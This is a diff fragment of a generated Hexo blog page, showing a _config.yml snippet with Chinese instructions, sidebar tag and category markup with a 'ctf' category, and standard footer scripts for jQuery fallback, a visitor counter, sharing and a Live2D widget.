+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="ctf"><span class="iconfont-archer">&#xe60a;</span>ctf</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "two_smi1e"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    <script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/miku.model.json"},"display":{"position":"right","width":120,"height":200},"mobile":{"show":false,"opacityOnHover":0.2},"log":false});</script></body>
+</html>
+
+
